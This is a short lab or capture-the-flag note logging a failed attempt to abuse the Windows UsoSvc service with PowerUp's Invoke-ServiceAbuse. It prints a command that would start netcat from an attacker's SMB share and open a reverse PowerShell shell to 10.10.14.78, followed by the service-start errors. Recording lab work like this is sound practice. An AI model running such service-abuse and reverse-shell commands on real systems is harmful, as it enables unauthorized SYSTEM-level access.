# Failed PowerUp's `Invoke-ServiceAbuse`

This was to abuse UsoSvc which was configurable to run command as SYSTEM but it didn't work. X:\ is a mounted share from Kali running impacket-smbserver

```shell
PS X:\> Start-Service : Service 'Update Orchestrator Service (UsoSvc)' cannot be started due to the following error: Cannot
start service UsoSvc on computer '.'.
At \\10.10.14.78\kali\PowerUp.ps1:2467 char:34
+ ...          $TargetService | Start-Service -ErrorAction SilentlyContinue
+                               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
   ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand


PS X:\> Invoke-ServiceAbuse -Name 'UsoSvc' -Command "\\10.10.14.78\kali\nc.exe -e powershell.exe 10.10.14.78 443"

ServiceAbused Command
------------- -------
UsoSvc        \\10.10.14.78\kali\nc.exe -e powershell.exe 10.10.14.78 443


PS X:\> Start-Service : Service 'Update Orchestrator Service (UsoSvc)' cannot be started due to the following error: Cannot
start service UsoSvc on computer '.'.
At \\10.10.14.78\kali\PowerUp.ps1:2467 char:34
+ ...          $TargetService | Start-Service -ErrorAction SilentlyContinue
+                               ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceController) [Start-Service],
   ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCommand

```

